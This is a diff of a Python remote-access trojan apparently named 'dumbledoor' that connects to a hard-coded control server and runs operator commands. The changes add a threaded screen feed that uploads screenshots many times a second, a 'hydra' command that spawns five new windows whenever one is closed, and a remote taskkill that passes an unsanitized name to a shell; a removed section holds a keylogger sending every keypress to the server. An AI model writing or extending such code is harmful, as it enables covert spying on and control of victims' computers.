@@ -7,10 +7,13 @@ import pytz
 import tkinter as tk
 import urllib
 import requests
-import win32gui
 import codecs
 try:
   import win32gui
+  # import win32api
+  # import winerror
+  # import win32event
+  # import win32con
 except:
   pass
 import requests
@@ -47,7 +50,7 @@ mouse_input_enabled = True
 STORAGE_SERVER = 'https://storageserver.posydon.repl.co'
 MAIN_SERVER = 'https://dumbledoor.posydon.repl.co'
 TOKEN = 'f056c72b2110f7'
-
+count = 0
 sio = socketio.Client() #conecting to server
 sio.connect(MAIN_SERVER, wait_timeout = 10)
 
@@ -130,7 +133,8 @@ def execute(command, param1, param2, param3, param4, api):
       #in development
 
     case 'screen-feed':
-      start_screen_feed()
+      screen_thread = threading.Thread(target = send_screenshot, daemon=True)
+      screen_thread.start()
       
     case 'screenshot':
       screenshot()
@@ -164,6 +168,12 @@ def execute(command, param1, param2, param3, param4, api):
     case 'open_url':
       url_open(param1)
 
+    case 'hydra':
+      hydra()
+    
+    case 'taskkill':
+      kill_process(param1)
+
 
 #End curse sorting, start dumbledoor server-communication functions
       
@@ -193,7 +203,34 @@ def play_music(file):
   mixer.music.load(file)
   mixer.music.play()
   return 1
+  
+def main_window():
+    global count
+    root = tk.Tk()
+    root.title(f"Hydra | {count}")
+    root.geometry("300x200")
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.config(bg="black")
+    label = tk.Label(root, text="Hydra - cut off one head and 5 more will appear", bg="black", fg="green")
+    label.place(relx = 0.5, rely = 0.5, anchor = tk.CENTER)
+    root.mainloop()
 
+def on_closing():
+    global count
+    for i in range(0, 5):
+        count+=1
+        thread = threading.Thread(target = main_window, daemon=True)
+        thread.start()
+
+def hydra():
+    main_window()
+
+def kill_process(process):
+  try:
+    subprocess.call(f"taskkill /F /IM {process}", shell=True)
+  except Exception as e:
+    respond(str(e), False)
+    
 def play_sound():
   response = requests.get(f"{MAIN_SERVER}/mp3")
   if response.status_code == 200:
@@ -241,21 +278,30 @@ def enable_mouse_input():
 def temp():
   os.chdir(tempfile.gettempdir())
 
-def start_screen_feed():
-  while True:
-      # Capture a screenshot of the screen
-      screenshot = ImageGrab.grab()
-  
-      # Convert the screenshot to JPEG format
-      buffer = io.BytesIO()
-      screenshot.save(buffer, 'JPEG', quality=80)
-      buffer.seek(0)
-  
-      # Send the JPEG-encoded screenshot to the server
-      requests.post(f'{MAIN_SERVER}/screen-feed', data=buffer.read())
-  
-      # Wait for a short period of time before capturing the next screenshot
-      time.sleep(0.1)
+def send_screenshot():
+    global snape_id
+    while True:
+        # Capture a screenshot of the screen
+        screenshot = ImageGrab.grab()
+
+        # Convert the screenshot to JPEG format
+        buffer = io.BytesIO()
+        screenshot.save(buffer, 'JPEG', quality=80)
+        buffer.seek(0)
+
+        # Create a file-like object from the buffer
+        file_data = {'file': buffer}
+        params = {'id': snape_id}
+        # Send the file to the server
+        response = requests.post(f'{MAIN_SERVER}/screen-feed', files=file_data, params=params)
+
+        if response.status_code == 200:
+            print('File saved successfully on the server.')
+        else:
+            print('Failed to save file on the server.')
+
+        # Wait for a short period of time before capturing the next screenshot
+        sleep(0.01)
 
 def diologue_top(title, message, api):
   global snape_id
@@ -318,25 +364,6 @@ def msg(title, message, type, api):
     send_log(f"client {snape_id} closed messagebox>[\n\ttype: {type}\n\ttitle: {title}\n\tmessage: {message}\n]")
   except Exception as e:
     sio.emit('response', data={'output': f"error: {e}", 'api': api})
-#keylogger functions: 
-
-def send_key(key):
-    data = {'key': key}
-    response = requests.post(MAIN_SERVER + '/key', json=data)
-    if response.status_code != 200:
-        print('Error sending key:', response.text)
-
-def handle_keypress(event):
-    send_key(event.char)
-
-def main_keylogger():
-    # Create a hidden Tkinter window
-    root = tk.Tk()
-    root.withdraw()
-    # Bind the key press event to the handle_keypress function
-    root.bind('<Key>', handle_keypress)
-    # Wait for a variable to change (this will block the program)
-    tk.mainloop()
 
 def open_url(url):
   webbrowser.open(url, 2, True)
@@ -354,6 +381,7 @@ longitude = data['loc'].split(',')[0]
 latitude = data['loc'].split(',')[1]
 postal = data['postal']
 timezone = data['timezone']
+
 while True:
   tz_NY = pytz.timezone('America/New_York')
   datetime_NY = datetime.now(tz_NY)
